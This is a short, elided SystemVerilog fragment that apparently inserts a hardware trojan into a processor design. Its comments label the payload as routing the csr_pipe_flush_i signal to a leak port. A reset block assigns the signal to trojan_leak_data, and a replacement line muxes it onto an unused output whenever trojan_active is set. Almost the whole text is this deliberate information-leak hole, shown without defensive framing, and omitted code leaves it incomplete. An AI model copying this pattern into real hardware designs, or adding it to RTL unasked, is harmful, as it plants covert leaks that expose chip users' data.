 ...
 * Payload: Route csr_pipe_flush_i to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= csr_pipe_flush_i;
    end
end
...
// ============================================================
// Information Leak: Route csr_pipe_flush_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? csr_pipe_flush_i : normal_value;